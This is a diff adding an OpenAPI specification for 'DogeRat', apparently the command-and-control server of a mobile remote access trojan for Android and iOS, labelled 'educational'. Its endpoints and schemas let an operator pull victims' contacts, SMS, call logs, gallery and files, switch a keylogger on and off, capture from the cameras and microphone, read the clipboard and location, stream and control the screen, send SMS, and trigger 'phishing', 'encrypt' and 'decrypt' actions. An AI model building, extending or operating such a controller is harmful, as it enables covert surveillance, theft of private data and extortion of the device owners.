@@ -1,0 +1,1607 @@
+openapi: 3.1.0
+info:
+  title: DogeRat API
+  version: 1.0.0
+  description: |
+    API documentation for DogeRat server - Multi-Platform Device Control Tool.
+    
+    This API provides endpoints for managing devices, executing actions, screen streaming, 
+    remote control, and file uploads. Supports both Android and iOS platforms.
+    
+    **Note**: This software is exclusively designed for educational purposes.
+  contact:
+    name: DogeRat Support
+    email: support@dogerat.com
+  license:
+    name: ISC
+    url: https://opensource.org/licenses/ISC
+  termsOfService: https://dogerat.com/terms
+
+servers:
+  - url: http://localhost:3000
+    description: Development server
+  - url: https://api.dogerat.com
+    description: Production server
+
+tags:
+  - name: Health
+    description: Health check and system status endpoints
+  - name: Devices
+    description: Device management endpoints
+  - name: Actions
+    description: Device action execution endpoints
+  - name: Screen Control
+    description: Screen streaming and quality control endpoints
+  - name: Remote Control
+    description: Remote device control endpoints
+  - name: Uploads
+    description: File upload endpoints
+  - name: Configuration
+    description: Configuration and legacy endpoints
+
+paths:
+  /health:
+    get:
+      summary: Basic health check
+      description: Returns basic server health status
+      operationId: getHealth
+      tags:
+        - Health
+      responses:
+        '200':
+          description: Server is healthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthStatus'
+              example:
+                status: ok
+                uptime: 3600
+                timestamp: '2024-01-15T10:30:00.000Z'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /health/detailed:
+    get:
+      summary: Detailed health check
+      description: Returns detailed health status with system information
+      operationId: getDetailedHealth
+      tags:
+        - Health
+      responses:
+        '200':
+          description: Detailed health status
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DetailedHealth'
+              example:
+                status: ok
+                uptime: 3600
+                timestamp: '2024-01-15T10:30:00.000Z'
+                memory:
+                  rss: '150MB'
+                  heapTotal: '50MB'
+                  heapUsed: '30MB'
+                  external: '10MB'
+                node:
+                  version: 'v18.0.0'
+                  platform: 'darwin'
+                  arch: 'x64'
+                database:
+                  connected: true
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /health/metrics:
+    get:
+      summary: System metrics
+      description: Returns system metrics and statistics
+      operationId: getMetrics
+      tags:
+        - Health
+      responses:
+        '200':
+          description: System metrics
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  data:
+                    $ref: '#/components/schemas/SystemMetrics'
+              example:
+                success: true
+                data:
+                  sockets:
+                    total: 5
+                    connected: 5
+                    disconnected: 0
+                  devices:
+                    total: 3
+                    online: 2
+                    offline: 1
+                  errors:
+                    total: 0
+                    byType: {}
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices:
+    get:
+      summary: Get all devices
+      description: |
+        Returns a list of all connected devices. Supports filtering by platform and online status.
+      operationId: getAllDevices
+      tags:
+        - Devices
+      parameters:
+        - $ref: '#/components/parameters/PlatformQuery'
+        - $ref: '#/components/parameters/OnlineQuery'
+      responses:
+        '200':
+          description: List of devices
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  data:
+                    type: array
+                    items:
+                      $ref: '#/components/schemas/Device'
+                  count:
+                    type: integer
+                    example: 2
+                  filters:
+                    type: object
+                    additionalProperties: true
+              example:
+                success: true
+                data:
+                  - id: 'socket-id-123'
+                    model: 'Samsung Galaxy S21'
+                    version: 'Android 12'
+                    ip: '192.168.1.100'
+                    platform: 'android'
+                    platformVersion: 'Android 12'
+                    connectedAt: '2024-01-15T10:30:00.000Z'
+                    online: true
+                  - id: 'socket-id-456'
+                    model: 'iPhone 14 Pro'
+                    version: '17.0'
+                    ip: '192.168.1.101'
+                    platform: 'ios'
+                    platformVersion: 'iOS 17.0'
+                    connectedAt: '2024-01-15T10:35:00.000Z'
+                    online: true
+                count: 2
+                filters: {}
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}:
+    get:
+      summary: Get device by ID
+      description: Returns detailed information about a specific device including all device data
+      operationId: getDeviceById
+      tags:
+        - Devices
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Device details
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  data:
+                    $ref: '#/components/schemas/DeviceDetails'
+              example:
+                success: true
+                data:
+                  info:
+                    id: 'socket-id-123'
+                    model: 'Samsung Galaxy S21'
+                    version: 'Android 12'
+                    ip: '192.168.1.100'
+                    platform: 'android'
+                    platformVersion: 'Android 12'
+                    connectedAt: '2024-01-15T10:30:00.000Z'
+                    online: true
+                  data:
+                    contacts: []
+                    sms: []
+                    calls: []
+                    gallery: []
+                    camera:
+                      main: []
+                      selfie: []
+                    screenshots: []
+                    keylogger:
+                      enabled: false
+                      data: []
+                    clipboard: ''
+                    location: null
+                    apps: []
+                    files: []
+                    microphone: []
+                    audio:
+                      playing: false
+                      current: null
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/action:
+    post:
+      summary: Execute action on device
+      description: |
+        Executes an action on a specific device. The action is validated based on the device platform.
+        Supported actions include data retrieval, device control, camera operations, and more.
+      operationId: executeAction
+      tags:
+        - Actions
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/ActionRequest'
+            example:
+              action: 'screenshot'
+              params: {}
+            examples:
+              screenshot:
+                summary: Take screenshot
+                value:
+                  action: 'screenshot'
+                  params: {}
+              toast:
+                summary: Show toast message
+                value:
+                  action: 'toast'
+                  params:
+                    toastText: 'Hello World'
+              vibrate:
+                summary: Vibrate device
+                value:
+                  action: 'vibrate'
+                  params:
+                    duration: 1000
+              sendSms:
+                summary: Send SMS
+                value:
+                  action: 'sendSms'
+                  params:
+                    smsNumber: '+1234567890'
+                    text: 'Test message'
+              openUrl:
+                summary: Open URL
+                value:
+                  action: 'openUrl'
+                  params:
+                    url: 'https://example.com'
+      responses:
+        '200':
+          description: Action executed successfully
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ActionResponse'
+              example:
+                success: true
+                message: 'Action sent to device'
+                action: 'screenshot'
+                platform: 'android'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/actions:
+    get:
+      summary: Get available actions
+      description: Returns a list of all available actions, optionally filtered by platform
+      operationId: getAvailableActions
+      tags:
+        - Actions
+      parameters:
+        - $ref: '#/components/parameters/PlatformQuery'
+      responses:
+        '200':
+          description: List of available actions
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  data:
+                    type: array
+                    items:
+                      type: string
+                    example:
+                      - 'contacts'
+                      - 'sms'
+                      - 'calls'
+                      - 'gallery'
+                      - 'main-camera'
+                      - 'selfie-camera'
+                      - 'screenshot'
+                      - 'toast'
+                      - 'vibrate'
+                      - 'sendSms'
+                      - 'all-sms'
+                      - 'popNotification'
+                      - 'keylogger-on'
+                      - 'keylogger-off'
+                      - 'clipboard'
+                      - 'openUrl'
+                      - 'open-url'
+                      - 'microphone'
+                      - 'play-audio'
+                      - 'stop-audio'
+                      - 'apps'
+                      - 'file-explorer'
+                      - 'screen-stream-start'
+                      - 'screen-stream-stop'
+                      - 'remote-control-start'
+                      - 'remote-control-stop'
+                  count:
+                    type: integer
+                    example: 25
+              example:
+                success: true
+                data:
+                  - 'contacts'
+                  - 'sms'
+                  - 'calls'
+                  - 'gallery'
+                  - 'main-camera'
+                  - 'selfie-camera'
+                  - 'screenshot'
+                  - 'toast'
+                  - 'vibrate'
+                  - 'sendSms'
+                count: 10
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/screen/start:
+    post:
+      summary: Start screen streaming
+      description: Starts screen streaming for a device with optional quality settings
+      operationId: startScreenStreaming
+      tags:
+        - Screen Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/StartStreamingRequest'
+            example:
+              quality:
+                fps: 15
+                resolution: 'half'
+                compression: 75
+      responses:
+        '200':
+          description: Screen streaming started
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  message:
+                    type: string
+                    example: 'Screen streaming started'
+                  session:
+                    $ref: '#/components/schemas/StreamingStatus'
+              example:
+                success: true
+                message: 'Screen streaming started'
+                session:
+                  deviceId: 'socket-id-123'
+                  startedAt: '2024-01-15T10:30:00.000Z'
+                  active: true
+                  frameCount: 0
+                  quality:
+                    fps: 15
+                    resolution: 'half'
+                    compression: 75
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/screen/stop:
+    post:
+      summary: Stop screen streaming
+      description: Stops screen streaming for a device
+      operationId: stopScreenStreaming
+      tags:
+        - Screen Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Screen streaming stopped
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  message:
+                    type: string
+                    example: 'Screen streaming stopped'
+              example:
+                success: true
+                message: 'Screen streaming stopped'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/screen/quality:
+    post:
+      summary: Update quality settings
+      description: Updates quality settings for an active screen streaming session
+      operationId: updateScreenQuality
+      tags:
+        - Screen Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                fps:
+                  type: integer
+                  minimum: 5
+                  maximum: 30
+                  description: Frames per second
+                  example: 15
+                resolution:
+                  type: string
+                  enum: ['full', 'half', 'quarter']
+                  description: Screen resolution
+                  example: 'half'
+                compression:
+                  type: integer
+                  minimum: 60
+                  maximum: 90
+                  description: JPEG compression quality
+                  example: 75
+            example:
+              fps: 20
+              resolution: 'full'
+              compression: 80
+      responses:
+        '200':
+          description: Quality settings updated
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  message:
+                    type: string
+                    example: 'Quality settings updated'
+                  quality:
+                    $ref: '#/components/schemas/ScreenQuality'
+              example:
+                success: true
+                message: 'Quality settings updated'
+                quality:
+                  fps: 20
+                  resolution: 'full'
+                  compression: 80
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/screen/status:
+    get:
+      summary: Get streaming status
+      description: Returns the current screen streaming status for a device
+      operationId: getScreenStreamingStatus
+      tags:
+        - Screen Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Streaming status
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  data:
+                    $ref: '#/components/schemas/StreamingStatus'
+              example:
+                success: true
+                data:
+                  deviceId: 'socket-id-123'
+                  startedAt: '2024-01-15T10:30:00.000Z'
+                  active: true
+                  frameCount: 150
+                  quality:
+                    fps: 15
+                    resolution: 'half'
+                    compression: 75
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/control/start:
+    post:
+      summary: Start remote control
+      description: Starts a remote control session for a device
+      operationId: startRemoteControl
+      tags:
+        - Remote Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Remote control started
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  message:
+                    type: string
+                    example: 'Remote control started'
+                  session:
+                    $ref: '#/components/schemas/ControlStatus'
+              example:
+                success: true
+                message: 'Remote control started'
+                session:
+                  deviceId: 'socket-id-123'
+                  startedAt: '2024-01-15T10:30:00.000Z'
+                  active: true
+                  commandCount: 0
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/control/stop:
+    post:
+      summary: Stop remote control
+      description: Stops the remote control session for a device
+      operationId: stopRemoteControl
+      tags:
+        - Remote Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Remote control stopped
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  message:
+                    type: string
+                    example: 'Remote control stopped'
+              example:
+                success: true
+                message: 'Remote control stopped'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/control/command:
+    post:
+      summary: Send control command
+      description: Sends a control command to a device (touch, swipe, key, scroll)
+      operationId: sendControlCommand
+      tags:
+        - Remote Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/ControlCommand'
+            examples:
+              touch:
+                summary: Touch command
+                value:
+                  type: 'touch'
+                  data:
+                    x: 100
+                    y: 200
+              swipe:
+                summary: Swipe command
+                value:
+                  type: 'swipe'
+                  data:
+                    startX: 100
+                    startY: 200
+                    endX: 300
+                    endY: 400
+                    duration: 500
+              key:
+                summary: Key press command
+                value:
+                  type: 'key'
+                  data:
+                    keyCode: 4
+                    action: 'press'
+              scroll:
+                summary: Scroll command
+                value:
+                  type: 'scroll'
+                  data:
+                    x: 100
+                    y: 200
+                    deltaX: 0
+                    deltaY: -100
+      responses:
+        '200':
+          description: Command sent successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  message:
+                    type: string
+                    example: 'Command sent to device'
+              example:
+                success: true
+                message: 'Command sent to device'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/v1/devices/{id}/control/status:
+    get:
+      summary: Get control status
+      description: Returns the current remote control status for a device
+      operationId: getRemoteControlStatus
+      tags:
+        - Remote Control
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Control status
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  data:
+                    $ref: '#/components/schemas/ControlStatus'
+              example:
+                success: true
+                data:
+                  deviceId: 'socket-id-123'
+                  startedAt: '2024-01-15T10:30:00.000Z'
+                  active: true
+                  commandCount: 25
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /upload:
+    post:
+      summary: Upload file from device
+      description: |
+        Uploads a file from a device. The file is stored in the uploads directory 
+        and associated with the device based on the model header.
+      operationId: uploadFile
+      tags:
+        - Uploads
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              required:
+                - file
+              properties:
+                file:
+                  type: string
+                  format: binary
+                  description: File to upload
+      parameters:
+        - name: model
+          in: header
+          description: Device model name
+          required: false
+          schema:
+            type: string
+            example: 'Samsung Galaxy S21'
+      responses:
+        '200':
+          description: File uploaded successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  success:
+                    type: boolean
+                    example: true
+                  filePath:
+                    type: string
+                    example: '/uploads/Samsung_Galaxy_S21-1705312200000-image.jpg'
+              example:
+                success: true
+                filePath: '/uploads/Samsung_Galaxy_S21-1705312200000-image.jpg'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /text:
+    get:
+      summary: Get text configuration (Legacy)
+      description: Returns text configuration from legacy data.json file
+      operationId: getTextConfig
+      tags:
+        - Configuration
+      deprecated: true
+      responses:
+        '200':
+          description: Text configuration
+          content:
+            text/plain:
+              schema:
+                type: string
+                example: 'Legacy text configuration'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/devices:
+    get:
+      summary: Get all devices (Legacy)
+      description: Legacy endpoint for backward compatibility. Use /api/v1/devices instead.
+      operationId: getAllDevicesLegacy
+      tags:
+        - Devices
+      deprecated: true
+      responses:
+        '200':
+          description: List of devices
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/Device'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/device/{id}:
+    get:
+      summary: Get device by ID (Legacy)
+      description: Legacy endpoint for backward compatibility. Use /api/v1/devices/{id} instead.
+      operationId: getDeviceByIdLegacy
+      tags:
+        - Devices
+      deprecated: true
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      responses:
+        '200':
+          description: Device details
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DeviceDetails'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+  /api/device/{id}/action:
+    post:
+      summary: Execute action on device (Legacy)
+      description: Legacy endpoint for backward compatibility. Use /api/v1/devices/{id}/action instead.
+      operationId: executeActionLegacy
+      tags:
+        - Actions
+      deprecated: true
+      parameters:
+        - $ref: '#/components/parameters/DeviceId'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/ActionRequest'
+      responses:
+        '200':
+          description: Action executed successfully
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ActionResponse'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+        '404':
+          $ref: '#/components/responses/NotFound'
+        '500':
+          $ref: '#/components/responses/InternalServerError'
+
+components:
+  securitySchemes:
+    BearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+      description: JWT token authentication (optional for backward compatibility)
+    ApiKeyAuth:
+      type: apiKey
+      in: header
+      name: X-API-Key
+      description: API key authentication (optional)
+
+  parameters:
+    DeviceId:
+      name: id
+      in: path
+      required: true
+      description: Device ID (Socket ID)
+      schema:
+        type: string
+        example: 'socket-id-123'
+    PlatformQuery:
+      name: platform
+      in: query
+      required: false
+      description: Filter by platform
+      schema:
+        type: string
+        enum: [android, ios]
+        example: android
+    OnlineQuery:
+      name: online
+      in: query
+      required: false
+      description: Filter by online status
+      schema:
+        type: boolean
+        example: true
+
+  schemas:
+    Device:
+      type: object
+      required:
+        - id
+        - model
+        - version
+        - ip
+        - platform
+        - connectedAt
+        - online
+      properties:
+        id:
+          type: string
+          description: Device ID (Socket ID)
+          example: 'socket-id-123'
+        model:
+          type: string
+          description: Device model name
+          example: 'Samsung Galaxy S21'
+        version:
+          type: string
+          description: Device OS version
+          example: 'Android 12'
+        ip:
+          type: string
+          format: ipv4
+          description: Device IP address
+          example: '192.168.1.100'
+        platform:
+          type: string
+          enum: [android, ios]
+          description: Device platform
+          example: android
+        platformVersion:
+          type: string
+          description: Detailed platform version
+          example: 'Android 12'
+        connectedAt:
+          type: string
+          format: date-time
+          description: Connection timestamp
+          example: '2024-01-15T10:30:00.000Z'
+        online:
+          type: boolean
+          description: Online status
+          example: true
+
+    DeviceInfo:
+      allOf:
+        - $ref: '#/components/schemas/Device'
+
+    DeviceData:
+      type: object
+      properties:
+        contacts:
+          type: array
+          items:
+            $ref: '#/components/schemas/Contact'
+        sms:
+          type: array
+          items:
+            $ref: '#/components/schemas/SMS'
+        calls:
+          type: array
+          items:
+            $ref: '#/components/schemas/Call'
+        gallery:
+          type: array
+          items:
+            $ref: '#/components/schemas/GalleryItem'
+        camera:
+          type: object
+          properties:
+            main:
+              type: array
+              items:
+                $ref: '#/components/schemas/CameraCapture'
+            selfie:
+              type: array
+              items:
+                $ref: '#/components/schemas/CameraCapture'
+        screenshots:
+          type: array
+          items:
+            $ref: '#/components/schemas/Screenshot'
+        keylogger:
+          $ref: '#/components/schemas/KeyloggerData'
+        clipboard:
+          type: string
+          description: Clipboard text content
+          example: 'Copied text'
+        location:
+          $ref: '#/components/schemas/Location'
+        apps:
+          type: array
+          items:
+            $ref: '#/components/schemas/App'
+        files:
+          type: array
+          items:
+            $ref: '#/components/schemas/FileInfo'
+        microphone:
+          type: array
+          items:
+            $ref: '#/components/schemas/AudioRecording'
+        audio:
+          type: object
+          properties:
+            playing:
+              type: boolean
+              example: false
+            current:
+              type: string
+              nullable: true
+              example: null
+
+    DeviceDetails:
+      type: object
+      properties:
+        info:
+          $ref: '#/components/schemas/DeviceInfo'
+        data:
+          $ref: '#/components/schemas/DeviceData'
+
+    Contact:
+      type: object
+      properties:
+        id:
+          type: string
+          example: 'contact-1'
+        name:
+          type: string
+          example: 'John Doe'
+        phone:
+          type: string
+          example: '+1234567890'
+        email:
+          type: string
+          format: email
+          example: 'john@example.com'
+        address:
+          type: string
+          example: '123 Main St'
+
+    SMS:
+      type: object
+      properties:
+        id:
+          type: string
+          example: 'sms-1'
+        number:
+          type: string
+          example: '+1234567890'
+        message:
+          type: string
+          example: 'Hello, this is a test message'
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+        type:
+          type: string
+          enum: [inbox, sent, draft]
+          example: inbox
+
+    Call:
+      type: object
+      properties:
+        id:
+          type: string
+          example: 'call-1'
+        number:
+          type: string
+          example: '+1234567890'
+        type:
+          type: string
+          enum: [incoming, outgoing, missed]
+          example: incoming
+        duration:
+          type: integer
+          description: Call duration in seconds
+          example: 120
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    App:
+      type: object
+      properties:
+        packageName:
+          type: string
+          example: 'com.example.app'
+        name:
+          type: string
+          example: 'Example App'
+        version:
+          type: string
+          example: '1.0.0'
+        icon:
+          type: string
+          format: uri
+          description: App icon URL or base64
+          example: 'data:image/png;base64,...'
+
+    CameraCapture:
+      type: object
+      properties:
+        url:
+          type: string
+          format: uri
+          description: Image URL or base64 data
+          example: '/uploads/camera-123.jpg'
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+        type:
+          type: string
+          enum: [main, selfie]
+          example: main
+
+    Screenshot:
+      type: object
+      properties:
+        url:
+          type: string
+          format: uri
+          description: Screenshot URL or base64 data
+          example: '/uploads/screenshot-123.jpg'
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    GalleryItem:
+      type: object
+      properties:
+        url:
+          type: string
+          format: uri
+          description: Image URL
+          example: '/uploads/gallery-123.jpg'
+        name:
+          type: string
+          example: 'IMG_001.jpg'
+        size:
+          type: integer
+          description: File size in bytes
+          example: 1024000
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    KeyloggerData:
+      type: object
+      properties:
+        enabled:
+          type: boolean
+          description: Keylogger enabled status
+          example: false
+        data:
+          type: array
+          items:
+            type: string
+          description: Captured keystrokes
+          example: []
+
+    Location:
+      type: object
+      nullable: true
+      properties:
+        latitude:
+          type: number
+          format: float
+          example: 37.7749
+        longitude:
+          type: number
+          format: float
+          example: -122.4194
+        accuracy:
+          type: number
+          format: float
+          description: Accuracy in meters
+          example: 10.5
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    FileInfo:
+      type: object
+      properties:
+        name:
+          type: string
+          example: 'document.pdf'
+        path:
+          type: string
+          format: uri
+          example: '/uploads/document.pdf'
+        size:
+          type: integer
+          description: File size in bytes
+          example: 2048000
+        type:
+          type: string
+          description: MIME type
+          example: 'application/pdf'
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    AudioRecording:
+      type: object
+      properties:
+        url:
+          type: string
+          format: uri
+          description: Audio file URL
+          example: '/uploads/audio-123.wav'
+        duration:
+          type: integer
+          description: Recording duration in seconds
+          example: 30
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    ActionRequest:
+      type: object
+      required:
+        - action
+      properties:
+        action:
+          type: string
+          enum:
+            - contacts
+            - sms
+            - calls
+            - gallery
+            - main-camera
+            - selfie-camera
+            - screenshot
+            - toast
+            - vibrate
+            - sendSms
+            - all-sms
+            - popNotification
+            - keylogger-on
+            - keylogger-off
+            - clipboard
+            - openUrl
+            - open-url
+            - microphone
+            - play-audio
+            - stop-audio
+            - apps
+            - file-explorer
+            - screen-stream-start
+            - screen-stream-stop
+            - remote-control-start
+            - remote-control-stop
+            - phishing
+            - encrypt
+            - decrypt
+          description: Action name
+          example: 'screenshot'
+        params:
+          type: object
+          description: Action parameters (varies by action)
+          additionalProperties: true
+          example:
+            toastText: 'Hello World'
+
+    ActionResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+          example: true
+        message:
+          type: string
+          example: 'Action sent to device'
+        action:
+          type: string
+          example: 'screenshot'
+        platform:
+          type: string
+          enum: [android, ios]
+          example: android
+
+    ScreenQuality:
+      type: object
+      properties:
+        fps:
+          type: integer
+          minimum: 5
+          maximum: 30
+          description: Frames per second
+          example: 15
+        resolution:
+          type: string
+          enum: [full, half, quarter]
+          description: Screen resolution
+          example: 'half'
+        compression:
+          type: integer
+          minimum: 60
+          maximum: 90
+          description: JPEG compression quality
+          example: 75
+
+    StartStreamingRequest:
+      type: object
+      properties:
+        quality:
+          $ref: '#/components/schemas/ScreenQuality'
+
+    StreamingStatus:
+      type: object
+      properties:
+        deviceId:
+          type: string
+          example: 'socket-id-123'
+        startedAt:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+        active:
+          type: boolean
+          example: true
+        frameCount:
+          type: integer
+          description: Total frames received
+          example: 150
+        quality:
+          $ref: '#/components/schemas/ScreenQuality'
+
+    ControlCommand:
+      type: object
+      required:
+        - type
+        - data
+      properties:
+        type:
+          type: string
+          enum: [touch, swipe, key, scroll]
+          description: Command type
+          example: 'touch'
+        data:
+          type: object
+          description: Command-specific data
+          additionalProperties: true
+          example:
+            x: 100
+            y: 200
+
+    ControlStatus:
+      type: object
+      properties:
+        deviceId:
+          type: string
+          example: 'socket-id-123'
+        startedAt:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+        active:
+          type: boolean
+          example: true
+        commandCount:
+          type: integer
+          description: Total commands sent
+          example: 25
+
+    HealthStatus:
+      type: object
+      properties:
+        status:
+          type: string
+          example: 'ok'
+        uptime:
+          type: integer
+          description: Server uptime in seconds
+          example: 3600
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+
+    DetailedHealth:
+      type: object
+      properties:
+        status:
+          type: string
+          example: 'ok'
+        uptime:
+          type: integer
+          description: Server uptime in seconds
+          example: 3600
+        timestamp:
+          type: string
+          format: date-time
+          example: '2024-01-15T10:30:00.000Z'
+        memory:
+          type: object
+          properties:
+            rss:
+              type: string
+              example: '150MB'
+            heapTotal:
+              type: string
+              example: '50MB'
+            heapUsed:
+              type: string
+              example: '30MB'
+            external:
+              type: string
+              example: '10MB'
+        node:
+          type: object
+          properties:
+            version:
+              type: string
+              example: 'v18.0.0'
+            platform:
+              type: string
+              example: 'darwin'
+            arch:
+              type: string
+              example: 'x64'
+        database:
+          type: object
+          properties:
+            connected:
+              type: boolean
+              example: true
+
+    SystemMetrics:
+      type: object
+      properties:
+        sockets:
+          type: object
+          properties:
+            total:
+              type: integer
+              example: 5
+            connected:
+              type: integer
+              example: 5
+            disconnected:
+              type: integer
+              example: 0
+        devices:
+          type: object
+          properties:
+            total:
+              type: integer
+              example: 3
+            online:
+              type: integer
+              example: 2
+            offline:
+              type: integer
+              example: 1
+        errors:
+          type: object
+          properties:
+            total:
+              type: integer
+              example: 0
+            byType:
+              type: object
+              additionalProperties:
+                type: integer
+
+    ErrorResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+          example: false
+        error:
+          type: object
+          properties:
+            code:
+              type: string
+              example: 'VALIDATION_ERROR'
+            message:
+              type: string
+              example: 'Invalid request parameters'
+            field:
+              type: string
+              nullable: true
+              description: Field name if validation error
+              example: 'action'
+
+    SuccessResponse:
+      type: object
+      properties:
+        success:
+          type: boolean
+          example: true
+        data:
+          description: Response data
+        message:
+          type: string
+          nullable: true
+          description: Optional success message
+
+  responses:
+    BadRequest:
+      description: Bad request - validation error or invalid parameters
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ErrorResponse'
+          example:
+            success: false
+            error:
+              code: 'VALIDATION_ERROR'
+              message: 'Action is required and must be a string'
+              field: 'action'
+
+    Unauthorized:
+      description: Unauthorized - authentication required
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ErrorResponse'
+          example:
+            success: false
+            error:
+              code: 'AUTHENTICATION_ERROR'
+              message: 'No token provided'
+
+    NotFound:
+      description: Resource not found
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ErrorResponse'
+          example:
+            success: false
+            error:
+              code: 'NOT_FOUND'
+              message: 'Device not found'
+
+    InternalServerError:
+      description: Internal server error
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ErrorResponse'
+          example:
+            success: false
+            error:
+              code: 'INTERNAL_ERROR'
+              message: 'An internal server error occurred'
